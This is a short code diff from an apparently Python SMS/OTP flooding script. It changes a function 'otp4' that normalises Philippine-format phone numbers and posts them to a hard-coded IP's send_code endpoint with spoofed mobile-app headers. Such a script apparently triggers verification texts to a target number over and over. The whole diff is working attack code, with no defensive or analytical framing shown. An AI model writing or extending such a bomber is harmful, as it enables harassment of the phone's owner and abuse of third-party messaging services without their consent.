@@ -149,8 +149,15 @@ def otp3(number):
         return False
 
 def otp4(number):
+    global limit, field
+    if str(number[0]) == "+":
+        number = "0"+str(number[1:])
+    elif str(number[:2]) == "63":
+        number = "0"+str(number[2:])
+    else:
+        pass
     url = "http://8.212.181.240:80/index/user/send_code"
-    header = {'Device-Id': '3076685aef999{}'.format(str(random.randint(100, 999))),'App-Id': 'UYJEeAtD','Authorization': '','Content-Type': 'application/json; charset=UTF-8','Content-Length': '23','Host': '8.212.181.240','Connection': 'Keep-Alive','Accept-Encoding': 'gzip','User-Agent': 'okhttp/4.9.0'}
+    header = {'Device-Id': '3076685aef999931','App-Id': 'UYJEeAtD','Authorization': '','Content-Type': 'application/json; charset=UTF-8','Content-Length': '23','Host': '8.212.181.240','Connection': 'Keep-Alive','Accept-Encoding': 'gzip','User-Agent': 'okhttp/4.9.0'}
     body = {"phone":str(number)}
     try:
         web = requests.post(url, headers = header, json = body)
